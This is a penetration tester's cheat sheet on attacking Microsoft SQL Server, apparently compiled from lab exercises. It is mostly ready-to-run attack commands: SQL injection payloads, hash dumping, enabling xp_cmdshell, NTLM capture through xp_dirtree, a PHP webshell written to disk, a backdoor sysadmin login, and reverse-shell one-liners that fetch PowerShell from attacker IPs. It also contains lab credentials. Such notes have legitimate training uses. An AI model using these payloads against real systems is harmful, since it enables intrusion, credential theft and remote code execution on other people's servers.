# MSSQL Port 1433

##### First Thoughts

- Enumerate DB users
- Can you impersonate a user with higher privs?
- Can you enable running system commands?
- Can you connect to a SMB share?
- Can you relay NTLM or PTH?
- Can you dump creds?
- Can you run queries on linked servers?


##### Enumeration

TEST DEFAULT CREDENTIALS.

````
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
````

#### PowerUpSQL

```bash
Import-Module .\PowerUpSQL.ps1
get-sqlinstancelocal
Get-SQLInstanceDomain
get-sqlserverinfo -instance "redsql\sqlexpress"
Invoke-SQLDumpInfo -Username flight\c.bum -password Tikkycoll_431012284 -Verbose
Get-SQLInstanceLocal -Username flight\c.bum -password Tikkycoll_431012284 -Verbose
Invoke-SQLAudit -Verbose -Instance SQLServer1
Invoke-SQLAudit -Username flight\c.bum -password Tikkycoll_431012284 -Verbose
sqlcmd.exe -S nagoya.nagoya-industries.com -U administrator -Q "EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
Get-SQLInstanceDomain -Verbose -DomainAccount svc_mssql
sqlcmd.exe -Q "use master; exec xp_dirtree '\\192.168.45.221\share\test'" -S nagoya.nagoya-industries.com`
```

##### Enumeration

```sql
select user_name();
select current_user;  -- alternate way
select system_user; # Database user name
select @@version;
select @@servername;
# show list of databases ("master." is optional)
select name from master.sys.databases;
exec sp_databases;  -- alternate way
# note: built-in databases are master, tempdb, model, and msdb
# you can exclude them to show only user-created databases like so:
select name from master.sys.databases where name not in ('master', 'tempdb', 'model', 'msdb');
use master
# getting table names from a specific database:
select table_name from somedatabase.information_schema.tables;
# getting column names from a specific table:
select column_name from somedatabase.information_schema.columns where table_name='sometable';
# get credentials for 'sa' login user:
select name,master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;
# get credentials from offsec database (using 'dbo' table schema) user table
select * from offsec.dbo.users;
# get logins
select * from master..syslogins;
SELECT name FROM master..sysobjects WHERE xtype = ‘U’; # Tables
select name from syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') # Column
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT NAME from master..syslogins where SYSADMIN=1;
```

##### Blind

```bash
# error/boolean-based blind injection
' AND LEN((SELECT TOP 1 username FROM dbo.users))=5; -- #
# time-based blind injection
' WAITFOR DELAY '0:0:3'; -- #
```

##### Load File

```bash
mysql> show variables like "secure_file_priv";
select LOAD_FILE("/xampp/htdocs/test.php");
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/xampp/htdocs/webshell.php';
```

##### Other Syntax

```bash
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
EXECUTE ('sp_configure "show advanced options", 1 ') AT [LOCAL.TEST.LINKED.SRV]
Execute (' RECONFIGURE' ) AT [LOCAL.TEST.LINKED.SRV]
EXECUTE ('sp_configure "xp_cmdshell", 1 ') AT [LOCAL.TEST.LINKED.SRV]
Execute (' RECONFIGURE' ) AT [LOCAL.TEST.LINKED.SRV]
EXECUTE ('xp_cmdshell "type \Users\Administrator\desktop\flag.txt" ') AT [LOCAL.TEST.LINKED.SRV]
```

##### Impacket

````
impacket-mssqlclient $user:$pass@$ip -windows-auth
````

##### Invoke-RunAs

If you have credentials for another user on a system, but cannot seem to login as them through any of the traditional methods, use the "Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "<reverse shell code>"" and execute a reverse shell to get onto the system as them.

##### Crackmapexec

````
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'
````

##### NetExec

Do not trust nxc's mssql  thing. try it manually, "impacket-mssqlclient administrator:hghgib6vHT3bVWf@10.10.112.154 -windows-auth"

````
nxc mssql $ip -u users.txt -p passwords.txt --continue-on-success
nxc mssql $ip -u users.txt -H $HASH --continue-on-success
````

##### Logging in

```bash
sqsh -S $ip -U sa -P CrimsonQuiltScalp193 #linux
proxychains sqsh -S 10.10.126.148 -U example.com\\sql_service -P password123 -D msdb #windows
```

##### Create a new Sysadmin

```sql
exec ('exec sp_addlogin "zys","Passw0rd"') at [sql01];
exec ('exec sp_addsrvrolemember "zys","sysadmin"') at [sql01];
```

##### Expliotation

```bash
xp_cmdshell whoami
enable_xp_cmdshell

# set up smb share locally to grab hash
xp_dirtree \\192.168.45.221\share\file
```

````
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
xp_cmdshell 'whoami'
xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
xp_cmdshell 'c:\Windows\Tasks\pwn.exe'
````

Revshell Command that worked:

```bash
admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
```

### Privilege Enumeration

Sysadmin logins/users.

```sql
Get-SQLQuery -Instance 'red.com,1433' -query "select name from master..syslogins where sysadmin=1;"
```
##### User/Login can be impersonated

```sql
Get-SQLQuery -Instance 'red.com,1433' -query "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
```

##### Linked Servers

Not all users can see all links.

```sql
select * from master..sysservers; (SQL Query)
exec sp_linkedservers; (SQL Query)
get-sqlserverlinkcrawl -instance "cywebdw\sqlexpress" -username webapp11 -password 89543dfGDFGH4d (PowerUpSQL Query)
get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "select * from openquery(""m3sqlw.red.local"",'select * from master..sysservers')" (PowerUpSQL Open Query)
```
##### Value of xp_cmdshell

```sql
select * from sys.configurations where name='xp_cmdshell' (SQL Query)
get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "select * from sys.configurations where name ='xp_cmdshell'" (PowerUpSQL Query)
get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "select * from openquery (""m3sqlw.red.local"",'select * from sys.configurations where name=''xp_cmdshell''')" (PowerUpSQL OpenQuery)
```
##### Enable xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
exec xp_cmdshell 'whoami'; (SQL Query)
get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;EXEC master.dbo.xp_cmdshell 'whoami';"  (PowerUpSQL Query)
get-sqlquery -instance "web06\sqlexpress" -query "exec ('sp_configure ''show advanced options'', 1; reconfigure; exec sp_configure ''xp_cmdshell'', 1; reconfigure;') AT sql03; exec('xp_cmdshell ''hostname'';') at SQL03" -username sa -password Passw0rd  (1 hop PowerUpSQL Query)
```

##### xp_cmdshell Meterpreter Shell
```bash
echo -en 'IEX ((new-object net.webclient).downloadstring("http://10.10.14.111/runner64.txt"))' | iconv -t UTF-16LE | base64 -w 0 (Encode Payload)
exec xp_cmdshell 'powershell -w hidden -enc <...>' (SQL Query)
Invoke-SQLOSCmd -Instance "CYWEBDW\SQLEXPRESS" -Command "powershell -w hidden -enc <...> " -RawResults  (PowerUpSQL Query 1)
get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "EXEC('xp_cmdshell ''powershell -w hidden -enc <...> '' ; ' ) " (PowerUpSQL Query 2)
get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "EXEC('xp_cmdshell ''powershell -w hidden -enc <...> '' ; ' )AT [m3sqlw.red.local]" (1 hop PowerUpSQL query)
````
##### Enable Rpcout
```sql
execute as login='sa'; exec sp_serveroption 'sql03', 'rpc out', 'true'; (SQL Query)
get-sqlquery -instance "cywebdb\sqlexpress" -query "execute as login ='sa'; exec sp_serveroption 'm3sqlw.red.local', 'rpc out', 'true'" (PowerUpSQL Query)
get-sqlquery -instance "cywebdb\sqlexpress" -query "execute as login ='sa'; exec (sp_serveroption 'm3sqlw.red.local', 'rpc out', 'true') at [m3sqlw.red.local]" (PowerUpSQL Open Query)
```

#### Reverse

Edit Invoke-PowerShellTcp.ps1:  

```bash
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
```

```bash
impacket-mssqlclient <user>@<ip> -db <database>
```

```bash
xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<ip>/Invoke-PowerShellTcp.ps1\")
```

https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

#### Possible Queries

Test for xp_cmdshell first. A great guide is pentestmonkey's mssql cheatsheet.

Test for stacked queries, which is unique to MSSQL. Open up share on machine, or nc on 445.

```bash
q=500'; exec xp_dirtree '\\10.10.14.8\share\file';-- - # Used 500' bc union returned on this
```

Test for xp_cmdshell.

```bash
q=500'; exec xp_cmdshell 'ping 10.10.14.8';-- - # Run sudo tcpdump -i tun0 icmp
q=500'; exec sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; exec xp_cmdshell 'ping 10.10.14.8';-- -
q=500' UNION SELECT 1,2,3,4,5,6; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.8:8000/rev.ps1") | powershell -noprofile';--+
q=500' UNION SELECT 1,2,3,4,5,6; exec sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.8:8000/rev.ps1") | powershell -noprofile';--+
```

For this, test for SQLi by doing something like '500%-- -' and checking response. Pick a field in response that only is returned for a valid search, and see when it's not returned.

```bash
select * from movies where name like '%500%';
q=500%'-- -
q=%500'-- -
q=500%' union select 1,2,3-- - # Until that field is returned
q=500' union select 1,2,3,4,5,6-- - # Same, RETURNED
q=500' union select 1,7337,9001,4,5,6-- -
q=500' union select 1,7337,9001,4,5,6-- -
q=500' union select 1,@@version,9001,4,5,6-- -
q=500' union select 1,user,9001,4,5,6-- -
q=500' union select 1,db_name(0),9001,4,5,6-- - # Run through integers to enum dbs
q=500' union select 1,name,3,4,5,6 from streamio..sysobjects where xtype='u'-- - # db is streamio
q=500' union select 1,CONCAT(name,':',id),3,4,5,6 from streamio..sysobjects where xtype='u'-- -
q=500' union select 1,string_agg(CONCAT(name,':',id),'|'),3,4,5,6 from streamio..sysobjects where xtype='u'-- - # Putting on a single row
q=500' union select 1,string_agg(CONCAT(name,':',id),'|'),3,4,5,6 from streamio..syscolumns where id=901578250-- - # 901.. is the users table that was returned from id
q=500' union select 1,string_agg(name,'|'),3,4,5,6 from streamio..syscolumns where id=901578250-- - # Don't need the id anymore, the last two have returned the columns, such as password, username, but not the data itself
q=500' union select 1,string_agg(concat(username,':',password),'|'),3,4,5,6 from users-- -
q=500' union select 1,string_agg(concat(username,':',password),'|'),3,4,5,6 from streamio..users-- -
```

```bash
select * from movies where CONTAINS (name, '*500*');
```

```bash
' or 1=1-- # Authentication Bypass
' SELECT @@version; WAITFOR DELAY '00:00:10'; — # Get Version + Delay
' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- # Enable xp_cmdshell
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<ip>/InvokePowerShellTcp.ps1')" ;-- # RCE
```

#### Enumeration

```bash
SELECT name FROM sys.databases;
SELECT * FROM master.INFORMATION_SCHEMA.TABLES;
```
##### Notes

If you're chiseling to look at mssql through the website on your localhost, go to phpmyadmin directory on the website

#### On Windows

If it has MSSQL installed. If not, you could always use Chisel.

```bash
sqlcmd -U db_admin -P 'B1@hx31234567890' -Q "USE STREAMIO_BACKUP; select username,password from users;"
```

```bash
sqlcmd -?
sqlcmd -Q "select name from sys.databases"
sqlcmd -Q "select * from sys.databases"
sqlcmd -Q "select name from sys.databases"
sqlcmd -Q "use umbraco; select * from umbraco..sysobjects"
sqlcmd -Q "use ADSync; exec xp_dirtree '\\10.10.14.8\share\file'"
sqlcmd -Q "use ADSync; select name from PK_mms_management_agent"
```

```bash
. .\PowerUpSQL.ps1
Invoke-SQLAudit -Verbose
```

#### Impersonation

If you can impersonate another user, try to grab the user's hash. (mssqlclient.py)

```bash
enum_impersonate
exec_as_login hrappdb-reader
exec_as_user hrappdb-reader
```

If you can't enable_xp_cmdshell or execute commands, try switching databases.

```bash
xp_dirtree //192.168.45.204/test/share
enable_xp_cmdshell
xp_cmdshell whoami
use hrappdb
```

If AD Azure, check out "https://blog.xpnsec.com/azuread-connect-for-redteam/".

sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; exec xp_cmdshell 'whoami'"
sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'c:\Windows\Tasks\shell80.exe'"
sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; exec xp_dirtree '\\192.168.45.221\share\file'"
sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; select * from umbraco..cmsMember"
sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; select * from umbraco..sysobjects"umbracoUserLogin umbracoUser umbracoUserGroup

.\sqlcmd.exe -Q "exec xp_cmdshell 'whoami'"
.\sqlcmd -Q "use master; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'whoami'"
sqlcmd -Q "use msdb; exec xp_cmdshell 'whoami'"
sqlcmd.exe -Q "use msdb; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'C:\Users\Christopher.Lewis\Documents\shell139.exe'"